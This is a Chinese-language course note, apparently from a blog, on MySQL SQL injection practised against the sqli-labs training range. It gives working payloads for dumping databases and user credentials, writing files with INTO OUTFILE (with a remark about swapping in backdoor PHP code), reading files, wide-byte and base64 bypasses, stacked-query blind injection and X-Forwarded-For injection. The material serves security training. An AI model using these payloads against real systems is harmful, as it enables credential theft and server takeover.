# 04-mysql注入




  

> 靶场下载地址：https://github.com/Audi-1/sqli-labs
  
### mysql数据库分层

    1.库名，表名，列名，数据库用户等
    2.数据库与WEB应用相结合的架构关系

```sql
Mysql数据库
        数据库A zblog  =  www.zblog.com
                表名
                        列名
                                数据
        数据库B dede   =  www.dede.com
                表名
                        列名
                                数据

PS：
数据库A及B都属于Mysql数据库里面的
数据库用户：管理数据库的用户
级别：管理员用户root 普通用户随机
自带数据库：mysql数据库自带的




```

#### mysql注入权限问题

- 普通用户   **（只能靠猜数据进行安全测试）**
- root用户 

**查询参数：**

```
user()
database()
version()    // 查询数据库版本
@@version_compile_os     // 操作系统版本

```

#### 跨库注入

>场景:   要渗透B， B没有漏洞，但是A有注入漏洞 

```sql
-- 
1.获取所有的数据库name    
-- select group_concat(schema_name) from information_schema.schemata;
http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata)

2. 再选取某个数据库下面的表  
http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')

3. 根据表查列
http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')

4. 查数据
http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(username,password) from security.users)
-- 或者
http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select concat_ws(0x7e,username,password) from security.users  limit 3,1)
-- 或者
http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from security.users)


```


sqlLabs 1 -7 练习

---



## MYSQL高权限注入

    mysql跨库注入-已讲
    mysql文件操作注入-sqlilabs less7



```sql
-- null
http://192.168.0.106/Less-7/?id=1')) union select null,null,null --+

--win的路径的话，加2个斜杠防止转义
-- 写入（aaa可以换成后门代码,txt可以换php）   （高版本，失败：需要数据库开启secure_file_priv，如果可以执行命令，可以绕过：下来自己查）
http://192.168.0.106/Less-7/?id=1')) union select  'aaa',null,null into outfile '/var/www/html/Less-7/test.txt' --+

-- 自己查资料？？？？？？？？？？


-- 读取文件
http://192.168.0.106/Less-7/?id=1')) union select   null,null,load_file('/var/www/html/Less-7/test.txt') --+


-- 路径问题：需要提前得到网站完整路径
-- 路径获取方法：
1.报错显示          inurl:php  warning
2.遗留文件        phpinfo()的 server_root。 script_filename
3.漏洞爆路径       discuzz爆路径
4.其他
    读取(配合load_file)网站解析配置文件
    字典盲猜测fuz： 


```



## MYSQL过滤型注入

mysql**宽字节**绕过注入-sqlilabs less32

> 宽字节注入条件：数据库编码为GBK等非中文

> 原理：%5c是反斜杠/ ,  而 %df%5c 是一个繁体字（我不会读），所以单引号成功逃逸

```sql
$id=check_addslashes($_GET['id']); # 在你输入单引号的时候，自动加\转义

魔术引号： magic_quote_gpc       (php.ini配置文件中), 打开之后，会转义单引号双引号  ------ 和上面的过滤函数有区别

【方法】：
%df"
%df'

http://192.168.0.106/Less-32/?id=-1%df%27 union select 1,2,3 -- + 


其他方法，自己查阅：？？？？？？？？？？

列举几个常用的URL转码的字符

空格           %20

单引号       %27

#                %23

\                 %5C


```

在PHP中，通过`iconv()`进行编码转换时，也可能存在宽字节注入漏洞  





## MYSQL其他注入

#### 加密编码注入       -sqlilabs less21  (post注入)

先加密，再填写
inurl:MQ=

```sql
了解主流加密/编码规律

```

#### base64注入攻击

程序代码中使用`base64_decode($_GET('id'))` 对参数进行解码

```
对 id' 进行base64编码后为  MSc=  ，而%3d是=的url编码， 拼接为 `MCs=%3d` 后尝试；
1 and 1=1 的base64编码为  ，1 and 1=2 的base64编码为 ， 分别放到id=的后门尝试， 结果如果不同，则存在漏洞
继续使用order by 继续

````

**其他利用场景：**
过waf， 绕过检测



#### 堆叠查询注入

堆叠查询可以执行多条sql语句，多语句之间使用**分号**隔开，**在第二个sql语句中构造自己要执行的语句**

例如：

```sql
';select if(substr(user(),1,1)='r', sleep(5),1) -- + 
-- 一般只会返回第一条sql的执行结果
http://192.168.0.121:8080/Less-9/?id=1%27; select if(left(user(),4)='root',sleep(5), 0); -- + 
-- 所以，在第二条语句中，可以私用update更新数据或者时间盲注获取数据

```


#### XFF注入

x-Forwarded-For， 代表客户端真实的ip， 修改后可以伪造客户端ip
将xff头改为:`127.0.0.1`访问，如果返回正常，分别设置为`127.0.0.1' and 1=1#` 和`127.0.0.1' and 1=2#`再次访问  ，根据返回结构判断有没有漏洞  
继续使用order by， 而后使用union `127.0.0.1' union select 1,2,3#`

php中的`getenv()`函数用于获取一个环境变量的值 ，如果不存在返回false



---

下次课继续...

---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/04-mysql%E6%B3%A8%E5%85%A5/  

